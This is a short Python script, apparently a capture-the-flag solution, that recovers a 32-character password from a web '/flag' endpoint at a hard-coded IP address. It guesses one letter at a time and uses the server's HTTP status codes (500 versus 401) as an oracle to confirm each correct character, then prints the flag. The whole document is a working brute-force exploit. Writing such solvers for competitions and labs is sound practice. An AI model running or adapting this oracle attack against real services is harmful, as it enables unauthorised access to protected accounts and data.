import requests as req
import string

ses = req.Session()

pass_list = [1 for i in range(32)]

host = "http://34.146.80.178:8001/flag"
# host = "http://127.0.0.1:8001/flag"

for i in range(32-1):
	for c in string.ascii_letters:
		pass_list[i] = c
		response = ses.post(host, json={"pass":pass_list})
		if response.status_code == 500:
			break
	print(pass_list)

for c in string.ascii_letters:
	pass_list[31] = c
	response = ses.post(host, json={"pass":pass_list})
	if response.status_code != 401:
		print(response.text)
		break
